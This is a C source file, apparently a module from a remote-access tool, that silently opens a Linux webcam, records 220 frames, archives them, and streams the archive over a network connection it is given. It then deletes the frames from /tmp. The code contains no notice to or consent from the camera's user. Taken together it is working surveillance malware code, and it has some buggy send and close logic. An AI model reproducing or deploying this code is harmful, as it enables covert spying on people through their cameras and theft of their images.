#include <errno.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <linux/videodev2.h>
#include <libv4l2.h>
#include <linux/videodev2.h>
#include <pthread.h>
#include <fcntl.h>

int compressAndSend(int conn);
#define CLEAR(x) memset(&(x), 0, sizeof(x))

/*

  Creado por "an0mal1a"

       https://github.com/an0mal1a

*/

struct buffer {
        void   *start;
        size_t length;
};

static void xioctl(int fh, int request, void *arg)
{
        int r;

        do {
                r = v4l2_ioctl(fh, request, arg);
        } while (r == -1 && ((errno == EINTR) || (errno == EAGAIN)));

        if (r == -1) {
                fprintf(stderr, "error %d, %s\\n", errno, strerror(errno));
                return;
        }
}

long get_file_size(char *filename) {
    struct stat file_status;
    if (stat(filename, &file_status) < 0) {
        return -1;
    }
    
    return file_status.st_size;
}

int compressAndSend(int conn){
        long file_size = get_file_size("/tmp/all.tar");
        char file_size_str[100];
        sprintf(file_size_str, "%ld", file_size);
        send(conn, file_size_str, strlen(file_size_str), 0);
        printf("\n%s", file_size_str);
        
        fflush(stdout);
        FILE* ptr;
        char str[2048];
        ptr = fopen("/tmp/all.tar", "rb");
 
        if (NULL == ptr) {
                printf("file can't be opened \n");
                send(conn, "error", strlen("error"), 0);
                fclose(ptr);
                return 1;
        }

        size_t bytesRead;
        while ((bytesRead = fread(str, 1, sizeof(str), ptr)) > 0) { 
                long size = sizeof(str);
                //send(conn, base64_encode(str, size, &size), 2048, 0);
                send(conn, str, size, 0);
                //printf("%s", base64_encode(str, sizeof(str) + 1));

                memset(str, 0, 2048);
        }
        
        fclose(ptr);
        return 0;
}

int startWeb(int conn){
        struct v4l2_format              fmt;
        struct v4l2_buffer              buf;
        struct v4l2_requestbuffers      req;
        enum v4l2_buf_type              type;
        fd_set                          fds;
        struct timeval                  tv;
        int                             r, fd = -1;
        unsigned int                    i, n_buffers;
        char                            *dev_name = "/dev/video0";
        char                            out_name[256];
        FILE                            *fout;
        struct buffer                   *buffers;

        fd = v4l2_open(dev_name, O_RDWR | O_NONBLOCK, 0);
        if (fd < 0) {
                send(conn, "no-cam", strlen("no-cam"), 0); 
                return 1;
        }
        
        CLEAR(fmt);
        fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        //fmt.fmt.pix.width       = 854;
        //fmt.fmt.pix.height      = 480;
        fmt.fmt.pix.width       = 1280;
        fmt.fmt.pix.height      = 720;
        fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_RGB24;
        fmt.fmt.pix.field       = V4L2_FIELD_INTERLACED;
        xioctl(fd, VIDIOC_S_FMT, &fmt);
        if (fmt.fmt.pix.pixelformat != V4L2_PIX_FMT_RGB24) {
                send(conn, "error", strlen("error"), 0);
                //printf("Libv4l didn't accept RGB24 format. Can't proceed.\\n");
                return 1;
        }
        if ((fmt.fmt.pix.width != 640) || (fmt.fmt.pix.height != 480))
                ;//printf("Warning: driver is sending image at %dx%d\\n",
                //        fmt.fmt.pix.width, fmt.fmt.pix.height);

        CLEAR(req);
        req.count = 2;
        req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        req.memory = V4L2_MEMORY_MMAP;
        xioctl(fd, VIDIOC_REQBUFS, &req);

        buffers = calloc(req.count, sizeof(*buffers));
        for (n_buffers = 0; n_buffers < req.count; ++n_buffers) {
                CLEAR(buf);

                buf.type        = V4L2_BUF_TYPE_VIDEO_CAPTURE;
                buf.memory      = V4L2_MEMORY_MMAP;
                buf.index       = n_buffers;

                xioctl(fd, VIDIOC_QUERYBUF, &buf);

                buffers[n_buffers].length = buf.length;
                buffers[n_buffers].start = v4l2_mmap(NULL, buf.length,
                            PROT_READ | PROT_WRITE, MAP_SHARED,
                            fd, buf.m.offset);

                if (MAP_FAILED == buffers[n_buffers].start) {
                        perror("mmap");
                        return 1;
                }
        }

        for (i = 0; i < n_buffers; ++i) {
                CLEAR(buf);
                buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
                buf.memory = V4L2_MEMORY_MMAP;
                buf.index = i;
                xioctl(fd, VIDIOC_QBUF, &buf);
        }
        type = V4L2_BUF_TYPE_VIDEO_CAPTURE;

        xioctl(fd, VIDIOC_STREAMON, &type);
        for (i = 0; i < 220; i++) {
                do {
                        FD_ZERO(&fds);
                        FD_SET(fd, &fds);

                        /* Timeout. */
                        tv.tv_sec = 4;
                        tv.tv_usec = 0;

                        r = select(fd + 1, &fds, NULL, NULL, &tv);
                } while ((r == -1 && (errno = EINTR)));
                if (r == -1) {
                        perror("select");
                        return errno;
                }

                CLEAR(buf);
                buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
                buf.memory = V4L2_MEMORY_MMAP;
                xioctl(fd, VIDIOC_DQBUF, &buf);

                sprintf(out_name, "/tmp/out%03d.ppm", i);
                fout = fopen(out_name, "w");
                if (!fout) {
                        perror("Cannot open image");
                        return 1;
                }
                fprintf(fout, "P6\n%d %d 255\n",
                        fmt.fmt.pix.width, fmt.fmt.pix.height);
                fwrite(buffers[buf.index].start, buf.bytesused, 1, fout);
                fclose(fout);

                xioctl(fd, VIDIOC_QBUF, &buf);

        }


        system("tar -cf /tmp/all.tar /tmp/out*.ppm");
        
        type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        xioctl(fd, VIDIOC_STREAMOFF, &type);
        for (i = 0; i < n_buffers; ++i)
                v4l2_munmap(buffers[i].start, buffers[i].length);
        v4l2_close(fd);
        compressAndSend(conn);

        system("rm -f /tmp/*.ppm");
        return 0;
}